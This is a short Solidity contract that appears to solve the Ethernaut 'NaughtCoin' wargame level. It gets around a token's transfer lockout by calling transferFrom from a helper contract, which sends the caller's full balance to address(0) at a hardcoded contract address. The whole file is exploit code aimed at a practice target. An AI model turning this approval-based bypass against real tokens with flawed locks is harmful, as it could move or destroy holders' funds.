// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC20.sol";

contract BeatNaughtCoin {
    IERC20 public naughtCoin;

    constructor() {
        naughtCoin = IERC20(0xa7bCa656682f0cCcD2250f566f66A93164B71ff4);
    }

    function beatNaught() public {
        naughtCoin.transferFrom(msg.sender, address(0), 1000000 ether);
    }
}
